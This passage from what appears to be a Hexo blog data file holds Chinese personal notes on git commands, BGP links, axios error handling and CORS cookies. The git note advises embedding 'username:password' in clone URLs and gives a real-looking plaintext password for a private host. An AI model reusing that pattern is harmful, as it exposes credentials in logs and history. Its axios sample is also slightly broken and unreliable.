lisc/.ssh/id_rsa.pub中。</p>\n<p>指纹的关键是:<br>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com</p>\n<p>关键的随机图像是:</p>\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>-[RSA 2048]- - - - - +<br>| | B + OO = = o<br>| o =。= + O |<br>| + o *。=。|<br>|。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n"},{"title":"git日常","date":"2018-05-04T03:07:12.000Z","_content":"# git使用日常\n\n## 一、拉取项目添加 \"用户名：密码\"\n git clone http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\n\n 克隆时可以 添加 `用户名：密码@` uri/url\n\n<br>\n\n## 二、[\"`git commit -m`\" 与 \"`git commit -am`\" 的区别](https://segmentfault.com/q/1010000005900988)\n\n````\ngit commit -am \"str\"\n# 等同于\ngit commit -a -m \"str\"\n````\n### 拓展\n通常我们提交git的时候都是\n\n````\ngit add .\ngit commit -m \"some str\"\ngit push\n````\n这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。\n````\ngit commit -am \"some str\"\ngit push\n````\n\n但是，`git commit -m` 和 `git commit -am`的区别在哪里？在于`a.txt`文件修改之后的处理\n\n下面，向`a.txt`添加内容'a'\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n而如果使用`git commit -am`，则可以省略`git add a.txt`这一步，因为`git commit -am`可以提交跟踪过的文件，而`a.txt`一开始已经被跟踪过了\n\n### **总结:**\n使用这两个命令区别的`关键`就是`git add`命令\n\n`git add`命令是个多功能命令，根据目标`文件状态`不同，此命令的效果也不同：可以用它`开始跟踪新文件`，或者`把已跟踪的文件放到暂存区`，还能用于`合并时把有冲突的文件标记为已解决状态`等\n\n我们需要用`git add`命令来跟踪新文件，但如果使用`git commit -am`可以省略使用`git add`命令将已跟踪文件放到暂存区的功能\n\n## git查看远程仓库信息\n> git remote -v\n\n> git remote show origin\n\n## git切换远程仓库地址\n方式一：修改远程仓库地址\n\n> git remote set-url origin URL  // 更换远程仓库地址，URL为新地址。\n\n方式二：先删除远程仓库地址，然后再添加\n\n> git remote rm origin // 删除现有远程仓库 \n> git remote add origin url // 添加新远程仓库\n\n## git添加、查看、删除远程仓库地址","source":"_posts/GIT/git日常.md","raw":"---\ntitle: git日常\ndate: 2018-05-04 11:07:12\ntags: git\n---\n# git使用日常\n\n## 一、拉取项目添加 \"用户名：密码\"\n git clone http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\n\n 克隆时可以 添加 `用户名：密码@` uri/url\n\n<br>\n\n## 二、[\"`git commit -m`\" 与 \"`git commit -am`\" 的区别](https://segmentfault.com/q/1010000005900988)\n\n````\ngit commit -am \"str\"\n# 等同于\ngit commit -a -m \"str\"\n````\n### 拓展\n通常我们提交git的时候都是\n\n````\ngit add .\ngit commit -m \"some str\"\ngit push\n````\n这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。\n````\ngit commit -am \"some str\"\ngit push\n````\n\n但是，`git commit -m` 和 `git commit -am`的区别在哪里？在于`a.txt`文件修改之后的处理\n\n下面，向`a.txt`添加内容'a'\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n而如果使用`git commit -am`，则可以省略`git add a.txt`这一步，因为`git commit -am`可以提交跟踪过的文件，而`a.txt`一开始已经被跟踪过了\n\n### **总结:**\n使用这两个命令区别的`关键`就是`git add`命令\n\n`git add`命令是个多功能命令，根据目标`文件状态`不同，此命令的效果也不同：可以用它`开始跟踪新文件`，或者`把已跟踪的文件放到暂存区`，还能用于`合并时把有冲突的文件标记为已解决状态`等\n\n我们需要用`git add`命令来跟踪新文件，但如果使用`git commit -am`可以省略使用`git add`命令将已跟踪文件放到暂存区的功能\n\n## git查看远程仓库信息\n> git remote -v\n\n> git remote show origin\n\n## git切换远程仓库地址\n方式一：修改远程仓库地址\n\n> git remote set-url origin URL  // 更换远程仓库地址，URL为新地址。\n\n方式二：先删除远程仓库地址，然后再添加\n\n> git remote rm origin // 删除现有远程仓库 \n> git remote add origin url // 添加新远程仓库\n\n## git添加、查看、删除远程仓库地址","slug":"GIT/git日常","published":1,"updated":"2018-09-30T08:15:21.824Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvv0043zodvsu17vjy7","content":"<h1 id=\"git使用日常\"><a href=\"#git使用日常\" class=\"headerlink\" title=\"git使用日常\"></a>git使用日常</h1><h2 id=\"一、拉取项目添加-“用户名：密码”\"><a href=\"#一、拉取项目添加-“用户名：密码”\" class=\"headerlink\" title=\"一、拉取项目添加 “用户名：密码”\"></a>一、拉取项目添加 “用户名：密码”</h2><p> git clone <a href=\"http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\" target=\"_blank\" rel=\"noopener\">http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git</a></p>\n<p> 克隆时可以 添加 <code>用户名：密码@</code> uri/url</p>\n<p><br></p>\n<h2 id=\"二、“git-commit-m“-与-“git-commit-am“-的区别\"><a href=\"#二、“git-commit-m“-与-“git-commit-am“-的区别\" class=\"headerlink\" title=\"二、“git commit -m“ 与 “git commit -am“ 的区别\"></a>二、<a href=\"https://segmentfault.com/q/1010000005900988\" target=\"_blank\" rel=\"noopener\">“<code>git commit -m</code>“ 与 “<code>git commit -am</code>“ 的区别</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;str&quot;</span><br><span class=\"line\"># 等同于</span><br><span class=\"line\">git commit -a -m &quot;str&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h3><p>通常我们提交git的时候都是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure></p>\n<p>但是，<code>git commit -m</code> 和 <code>git commit -am</code>的区别在哪里？在于<code>a.txt</code>文件修改之后的处理</p>\n<p>下面，向<code>a.txt</code>添加内容’a’</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>而如果使用<code>git commit -am</code>，则可以省略<code>git add a.txt</code>这一步，因为<code>git commit -am</code>可以提交跟踪过的文件，而<code>a.txt</code>一开始已经被跟踪过了</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h3><p>使用这两个命令区别的<code>关键</code>就是<code>git add</code>命令</p>\n<p><code>git add</code>命令是个多功能命令，根据目标<code>文件状态</code>不同，此命令的效果也不同：可以用它<code>开始跟踪新文件</code>，或者<code>把已跟踪的文件放到暂存区</code>，还能用于<code>合并时把有冲突的文件标记为已解决状态</code>等</p>\n<p>我们需要用<code>git add</code>命令来跟踪新文件，但如果使用<code>git commit -am</code>可以省略使用<code>git add</code>命令将已跟踪文件放到暂存区的功能</p>\n<h2 id=\"git查看远程仓库信息\"><a href=\"#git查看远程仓库信息\" class=\"headerlink\" title=\"git查看远程仓库信息\"></a>git查看远程仓库信息</h2><blockquote>\n<p>git remote -v</p>\n<p>git remote show origin</p>\n</blockquote>\n<h2 id=\"git切换远程仓库地址\"><a href=\"#git切换远程仓库地址\" class=\"headerlink\" title=\"git切换远程仓库地址\"></a>git切换远程仓库地址</h2><p>方式一：修改远程仓库地址</p>\n<blockquote>\n<p>git remote set-url origin URL  // 更换远程仓库地址，URL为新地址。</p>\n</blockquote>\n<p>方式二：先删除远程仓库地址，然后再添加</p>\n<blockquote>\n<p>git remote rm origin // 删除现有远程仓库<br>git remote add origin url // 添加新远程仓库</p>\n</blockquote>\n<h2 id=\"git添加、查看、删除远程仓库地址\"><a href=\"#git添加、查看、删除远程仓库地址\" class=\"headerlink\" title=\"git添加、查看、删除远程仓库地址\"></a>git添加、查看、删除远程仓库地址</h2>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git使用日常\"><a href=\"#git使用日常\" class=\"headerlink\" title=\"git使用日常\"></a>git使用日常</h1><h2 id=\"一、拉取项目添加-“用户名：密码”\"><a href=\"#一、拉取项目添加-“用户名：密码”\" class=\"headerlink\" title=\"一、拉取项目添加 “用户名：密码”\"></a>一、拉取项目添加 “用户名：密码”</h2><p> git clone <a href=\"http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\" target=\"_blank\" rel=\"noopener\">http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git</a></p>\n<p> 克隆时可以 添加 <code>用户名：密码@</code> uri/url</p>\n<p><br></p>\n<h2 id=\"二、“git-commit-m“-与-“git-commit-am“-的区别\"><a href=\"#二、“git-commit-m“-与-“git-commit-am“-的区别\" class=\"headerlink\" title=\"二、“git commit -m“ 与 “git commit -am“ 的区别\"></a>二、<a href=\"https://segmentfault.com/q/1010000005900988\" target=\"_blank\" rel=\"noopener\">“<code>git commit -m</code>“ 与 “<code>git commit -am</code>“ 的区别</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;str&quot;</span><br><span class=\"line\"># 等同于</span><br><span class=\"line\">git commit -a -m &quot;str&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h3><p>通常我们提交git的时候都是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure></p>\n<p>但是，<code>git commit -m</code> 和 <code>git commit -am</code>的区别在哪里？在于<code>a.txt</code>文件修改之后的处理</p>\n<p>下面，向<code>a.txt</code>添加内容’a’</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>而如果使用<code>git commit -am</code>，则可以省略<code>git add a.txt</code>这一步，因为<code>git commit -am</code>可以提交跟踪过的文件，而<code>a.txt</code>一开始已经被跟踪过了</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h3><p>使用这两个命令区别的<code>关键</code>就是<code>git add</code>命令</p>\n<p><code>git add</code>命令是个多功能命令，根据目标<code>文件状态</code>不同，此命令的效果也不同：可以用它<code>开始跟踪新文件</code>，或者<code>把已跟踪的文件放到暂存区</code>，还能用于<code>合并时把有冲突的文件标记为已解决状态</code>等</p>\n<p>我们需要用<code>git add</code>命令来跟踪新文件，但如果使用<code>git commit -am</code>可以省略使用<code>git add</code>命令将已跟踪文件放到暂存区的功能</p>\n<h2 id=\"git查看远程仓库信息\"><a href=\"#git查看远程仓库信息\" class=\"headerlink\" title=\"git查看远程仓库信息\"></a>git查看远程仓库信息</h2><blockquote>\n<p>git remote -v</p>\n<p>git remote show origin</p>\n</blockquote>\n<h2 id=\"git切换远程仓库地址\"><a href=\"#git切换远程仓库地址\" class=\"headerlink\" title=\"git切换远程仓库地址\"></a>git切换远程仓库地址</h2><p>方式一：修改远程仓库地址</p>\n<blockquote>\n<p>git remote set-url origin URL  // 更换远程仓库地址，URL为新地址。</p>\n</blockquote>\n<p>方式二：先删除远程仓库地址，然后再添加</p>\n<blockquote>\n<p>git remote rm origin // 删除现有远程仓库<br>git remote add origin url // 添加新远程仓库</p>\n</blockquote>\n<h2 id=\"git添加、查看、删除远程仓库地址\"><a href=\"#git添加、查看、删除远程仓库地址\" class=\"headerlink\" title=\"git添加、查看、删除远程仓库地址\"></a>git添加、查看、删除远程仓库地址</h2>"},{"title":"BGP多线","date":"2018-06-25T10:29:52.000Z","_content":"## [BGP概念](https://baike.baidu.com/item/BGP多线)\n\n## [互联网AS(自治系统)](https://baike.baidu.com/item/自治系统)\n\n## [边界网关协议](https://baike.baidu.com/item/边界网关协议)","source":"_posts/HTTP/BGP多线.md","raw":"---\ntitle: BGP多线\ndate: 2018-06-25 18:29:52\ntags: BGP\ncategories: HTTP\n---\n## [BGP概念](https://baike.baidu.com/item/BGP多线)\n\n## [互联网AS(自治系统)](https://baike.baidu.com/item/自治系统)\n\n## [边界网关协议](https://baike.baidu.com/item/边界网关协议)","slug":"HTTP/BGP多线","published":1,"updated":"2018-09-05T06:33:18.491Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvx0044zodvzft1p0l5","content":"<h2 id=\"BGP概念\"><a href=\"#BGP概念\" class=\"headerlink\" title=\"BGP概念\"></a><a href=\"https://baike.baidu.com/item/BGP多线\" target=\"_blank\" rel=\"noopener\">BGP概念</a></h2><h2 id=\"互联网AS-自治系统\"><a href=\"#互联网AS-自治系统\" class=\"headerlink\" title=\"互联网AS(自治系统)\"></a><a href=\"https://baike.baidu.com/item/自治系统\" target=\"_blank\" rel=\"noopener\">互联网AS(自治系统)</a></h2><h2 id=\"边界网关协议\"><a href=\"#边界网关协议\" class=\"headerlink\" title=\"边界网关协议\"></a><a href=\"https://baike.baidu.com/item/边界网关协议\" target=\"_blank\" rel=\"noopener\">边界网关协议</a></h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"BGP概念\"><a href=\"#BGP概念\" class=\"headerlink\" title=\"BGP概念\"></a><a href=\"https://baike.baidu.com/item/BGP多线\" target=\"_blank\" rel=\"noopener\">BGP概念</a></h2><h2 id=\"互联网AS-自治系统\"><a href=\"#互联网AS-自治系统\" class=\"headerlink\" title=\"互联网AS(自治系统)\"></a><a href=\"https://baike.baidu.com/item/自治系统\" target=\"_blank\" rel=\"noopener\">互联网AS(自治系统)</a></h2><h2 id=\"边界网关协议\"><a href=\"#边界网关协议\" class=\"headerlink\" title=\"边界网关协议\"></a><a href=\"https://baike.baidu.com/item/边界网关协议\" target=\"_blank\" rel=\"noopener\">边界网关协议</a></h2>"},{"title":"axios返回值解析","date":"2018-07-30T01:40:08.000Z","_content":"## axios返回值解析\n\n````\naxios(\n  {\n    url: settings.pathAPI + path,\n    method: 'post',\n    data: {},\n    transformRequest: [],\n    withCredentials: true, // 跨域设置cookie\n    headers: {\n      'Content-Type': 'application/x-www-form-urlencoded'\n    }\n  }\n)\n.then((response: any) => {\n  let responseData = response.data\n  console.log(\"response::\", response);\n\n  if (typeof (response) === 'string') {\n    responseData = json(response) // `做字符串解析`\n  }\n  switch (responseData.code) {\n    case 404:\n      if (settings.debug) {\n              console.log('Not Found')\n      }\n      break\n\n    case 500:\n      if (settings.debug) {\n        console.log('Internal Server Error:')\n      }\n      break\n\n    default:\n      callback(responseData)\n  }\n})\n.catch((reason: any) => {\n  for (let k in reason) {\n    console.log(k, reason[k]);\n  } // 查看 属性\n  switch (reason['response']['status']) {\n    case 403:\n      return redirect('/login') // 路由跳转\n    case 404:\n      if (settings_1.settings.debug) {\n              console.log('Not Found');\n      }\n      break;\n    case 500:\n      if (settings_1.settings.debug) {\n              console.log('Internal Server Error:');\n      }\n      break;\n    default:\n      callback(responseData);\n  }\n  console.log(reason);\n  console.log(`%c reason %c ${reason} `, \"background:#f00 ; padding: 1px; border-radius: 3px 0 0 3px;  color: #fff\", \"background:#41b883 ; padding: 1px; border-radius: 0 3px 3px 0;  color: #000\");\n})\n````\ncatch 中 返回值 `reason` 默认是解析成字符串，但是可以用 `fon in` 方法，遍历Obj对象。","source":"_posts/HTTP/axios返回值解析.md","raw":"---\ntitle: axios返回值解析\ndate: 2018-07-30 09:40:08\ntags: axios返回值\ncategories: axios\n---\n## axios返回值解析\n\n````\naxios(\n  {\n    url: settings.pathAPI + path,\n    method: 'post',\n    data: {},\n    transformRequest: [],\n    withCredentials: true, // 跨域设置cookie\n    headers: {\n      'Content-Type': 'application/x-www-form-urlencoded'\n    }\n  }\n)\n.then((response: any) => {\n  let responseData = response.data\n  console.log(\"response::\", response);\n\n  if (typeof (response) === 'string') {\n    responseData = json(response) // `做字符串解析`\n  }\n  switch (responseData.code) {\n    case 404:\n      if (settings.debug) {\n              console.log('Not Found')\n      }\n      break\n\n    case 500:\n      if (settings.debug) {\n        console.log('Internal Server Error:')\n      }\n      break\n\n    default:\n      callback(responseData)\n  }\n})\n.catch((reason: any) => {\n  for (let k in reason) {\n    console.log(k, reason[k]);\n  } // 查看 属性\n  switch (reason['response']['status']) {\n    case 403:\n      return redirect('/login') // 路由跳转\n    case 404:\n      if (settings_1.settings.debug) {\n              console.log('Not Found');\n      }\n      break;\n    case 500:\n      if (settings_1.settings.debug) {\n              console.log('Internal Server Error:');\n      }\n      break;\n    default:\n      callback(responseData);\n  }\n  console.log(reason);\n  console.log(`%c reason %c ${reason} `, \"background:#f00 ; padding: 1px; border-radius: 3px 0 0 3px;  color: #fff\", \"background:#41b883 ; padding: 1px; border-radius: 0 3px 3px 0;  color: #000\");\n})\n````\ncatch 中 返回值 `reason` 默认是解析成字符串，但是可以用 `fon in` 方法，遍历Obj对象。","slug":"HTTP/axios返回值解析","published":1,"updated":"2018-09-05T06:33:18.492Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxw00048zodvjiogdviv","content":"<h2 id=\"axios返回值解析\"><a href=\"#axios返回值解析\" class=\"headerlink\" title=\"axios返回值解析\"></a>axios返回值解析</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    url: settings.pathAPI + path,</span><br><span class=\"line\">    method: &apos;post&apos;,</span><br><span class=\"line\">    data: &#123;&#125;,</span><br><span class=\"line\">    transformRequest: [],</span><br><span class=\"line\">    withCredentials: true, // 跨域设置cookie</span><br><span class=\"line\">    headers: &#123;</span><br><span class=\"line\">      &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\">.then((response: any) =&gt; &#123;</span><br><span class=\"line\">  let responseData = response.data</span><br><span class=\"line\">  console.log(&quot;response::&quot;, response);</span><br><span class=\"line\"></span><br><span class=\"line\">  if (typeof (response) === &apos;string&apos;) &#123;</span><br><span class=\"line\">    responseData = json(response) // `做字符串解析`</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  switch (responseData.code) &#123;</span><br><span class=\"line\">    case 404:</span><br><span class=\"line\">      if (settings.debug) &#123;</span><br><span class=\"line\">              console.log(&apos;Not Found&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break</span><br><span class=\"line\"></span><br><span class=\"line\">    case 500:</span><br><span class=\"line\">      if (settings.debug) &#123;</span><br><span class=\"line\">        console.log(&apos;Internal Server Error:&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break</span><br><span class=\"line\"></span><br><span class=\"line\">    default:</span><br><span class=\"line\">      callback(responseData)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch((reason: any) =&gt; &#123;</span><br><span class=\"line\">  for (let k in reason) &#123;</span><br><span class=\"line\">    console.log(k, reason[k]);</span><br><span class=\"line\">  &#125; // 查看 属性</span><br><span class=\"line\">  switch (reason[&apos;response&apos;][&apos;status&apos;]) &#123;</span><br><span class=\"line\">    case 403:</span><br><span class=\"line\">      return redirect(&apos;/login&apos;) // 路由跳转</span><br><span class=\"line\">    case 404:</span><br><span class=\"line\">      if (settings_1.settings.debug) &#123;</span><br><span class=\"line\">              console.log(&apos;Not Found&apos;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    case 500:</span><br><span class=\"line\">      if (settings_1.settings.debug) &#123;</span><br><span class=\"line\">              console.log(&apos;Internal Server Error:&apos;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    default:</span><br><span class=\"line\">      callback(responseData);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  console.log(reason);</span><br><span class=\"line\">  console.log(`%c reason %c $&#123;reason&#125; `, &quot;background:#f00 ; padding: 1px; border-radius: 3px 0 0 3px;  color: #fff&quot;, &quot;background:#41b883 ; padding: 1px; border-radius: 0 3px 3px 0;  color: #000&quot;);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>catch 中 返回值 <code>reason</code> 默认是解析成字符串，但是可以用 <code>fon in</code> 方法，遍历Obj对象。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"axios返回值解析\"><a href=\"#axios返回值解析\" class=\"headerlink\" title=\"axios返回值解析\"></a>axios返回值解析</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    url: settings.pathAPI + path,</span><br><span class=\"line\">    method: &apos;post&apos;,</span><br><span class=\"line\">    data: &#123;&#125;,</span><br><span class=\"line\">    transformRequest: [],</span><br><span class=\"line\">    withCredentials: true, // 跨域设置cookie</span><br><span class=\"line\">    headers: &#123;</span><br><span class=\"line\">      &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\">.then((response: any) =&gt; &#123;</span><br><span class=\"line\">  let responseData = response.data</span><br><span class=\"line\">  console.log(&quot;response::&quot;, response);</span><br><span class=\"line\"></span><br><span class=\"line\">  if (typeof (response) === &apos;string&apos;) &#123;</span><br><span class=\"line\">    responseData = json(response) // `做字符串解析`</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  switch (responseData.code) &#123;</span><br><span class=\"line\">    case 404:</span><br><span class=\"line\">      if (settings.debug) &#123;</span><br><span class=\"line\">              console.log(&apos;Not Found&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break</span><br><span class=\"line\"></span><br><span class=\"line\">    case 500:</span><br><span class=\"line\">      if (settings.debug) &#123;</span><br><span class=\"line\">        console.log(&apos;Internal Server Error:&apos;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break</span><br><span class=\"line\"></span><br><span class=\"line\">    default:</span><br><span class=\"line\">      callback(responseData)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch((reason: any) =&gt; &#123;</span><br><span class=\"line\">  for (let k in reason) &#123;</span><br><span class=\"line\">    console.log(k, reason[k]);</span><br><span class=\"line\">  &#125; // 查看 属性</span><br><span class=\"line\">  switch (reason[&apos;response&apos;][&apos;status&apos;]) &#123;</span><br><span class=\"line\">    case 403:</span><br><span class=\"line\">      return redirect(&apos;/login&apos;) // 路由跳转</span><br><span class=\"line\">    case 404:</span><br><span class=\"line\">      if (settings_1.settings.debug) &#123;</span><br><span class=\"line\">              console.log(&apos;Not Found&apos;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    case 500:</span><br><span class=\"line\">      if (settings_1.settings.debug) &#123;</span><br><span class=\"line\">              console.log(&apos;Internal Server Error:&apos;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    default:</span><br><span class=\"line\">      callback(responseData);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  console.log(reason);</span><br><span class=\"line\">  console.log(`%c reason %c $&#123;reason&#125; `, &quot;background:#f00 ; padding: 1px; border-radius: 3px 0 0 3px;  color: #fff&quot;, &quot;background:#41b883 ; padding: 1px; border-radius: 0 3px 3px 0;  color: #000&quot;);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>catch 中 返回值 <code>reason</code> 默认是解析成字符串，但是可以用 <code>fon in</code> 方法，遍历Obj对象。</p>\n"},{"title":"跨域创建Cookie","date":"2018-07-27T03:21:49.000Z","_content":"## 跨域创建Cookie\n\n要想浏览器处理 CORS 跨域中的 Cookie 只需要分别在网页以及服务端作出一点点改变：\n\n1.前端，对于跨域的 XMLHttpRequest 请求，需要设置 `withCredentials` 属性为 